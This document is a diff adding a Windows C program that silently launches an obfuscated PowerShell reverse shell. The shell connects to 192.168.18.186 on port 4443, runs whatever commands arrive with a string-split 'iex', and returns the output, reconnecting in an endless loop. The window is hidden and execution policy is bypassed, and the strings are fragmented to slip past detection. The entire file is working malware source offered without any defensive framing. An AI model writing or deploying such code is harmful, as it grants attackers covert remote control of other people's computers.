@@ -1,0 +1,81 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+void executeHidden(const char *command) {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // Zero out the memory
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Set the startup info to hide the window
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Ensure window is hidden
+
+    // Create the process
+    if (!CreateProcess(
+        NULL,                // No module name (use command line)
+        (LPSTR)command,      // Command line
+        NULL,                // Process handle not inheritable
+        NULL,                // Thread handle not inheritable
+        FALSE,               // Set handle inheritance to FALSE
+        CREATE_NO_WINDOW,    // Do not create a window
+        NULL,                // Use parent's environment block
+        NULL,                // Use parent's starting directory 
+        &si,                 // Pointer to STARTUPINFO structure
+        &pi)                 // Pointer to PROCESS_INFORMATION structure
+    ) {
+        printf("Failed to create process: %d\n", GetLastError());
+        return;
+    }
+
+    // Close process and thread handles
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+int main() {
+    char username[256];
+    DWORD username_len = sizeof(username);
+
+    // Get the username of the current user
+    if (GetUserNameA(username, &username_len) == 0) {
+        printf("Failed to get the username.\n");
+        return 1;
+    }
+ 
+    // PowerShell command to execute the obfuscated reverse TCP shell script
+    const char* reverseShellCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
+                                       "\"while ($true) { "
+                                       "try { "
+                                       "$p1 = '192'; $p2 = '168'; $p3 = '18'; $p4 = '186'; "
+                                       "$ip = \\\"$($p1).$($p2).$($p3).$($p4)\\\"; "
+                                       "$nObj = \\\"New-Object\\\"; "
+                                       "$sys = \\\"System\\\"; $net = \\\"Net\\\"; $socks = \\\"Sockets\\\"; $tcp = \\\"TCPClient\\\"; "
+                                       "$tcpType = \\\"$sys.$net.$socks.$tcp\\\"; "
+                                       "$conn = & $nObj $tcpType $ip, 4443; "
+                                       "$gStream = \\\"GetStream\\\"; "
+                                       "$stream = $conn.$gStream(); "
+                                       "[byte[]]$bBuf = 0..65535 | ForEach-Object {0}; "
+                                       "while (($bRead = $stream.Read($bBuf, 0, $bBuf.Length)) -ne 0) { "
+                                       "$cmdIn = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bBuf, 0, $bRead); "
+                                       "$invExp = (\\\"i{0}x\\\" -f \\\"e\\\"); "
+                                       "$pwd = (\\\"p{0}d\\\" -f \\\"w\\\"); "
+                                       "$cmdOut = (& $invExp $cmdIn 2>&1 | Out-String); "
+                                       "$respData = $cmdOut + 'PS ' + (& $pwd).Path + '> '; "
+                                       "$respBytes = ([text.encoding]::ASCII).GetBytes($respData); "
+                                       "$stream.Write($respBytes, 0, $respBytes.Length); "
+                                       "$f = \\\"Flush\\\"; $stream.$f(); "
+                                       "}; "
+                                       "$conn.Close(); "
+                                       "} catch { Start-Sleep -Seconds 5; } "
+                                       "}\"";
+
+    // Execute the reverse shell command hidden
+    executeHidden(reverseShellCommand);
+ 
+    return 0;
+}
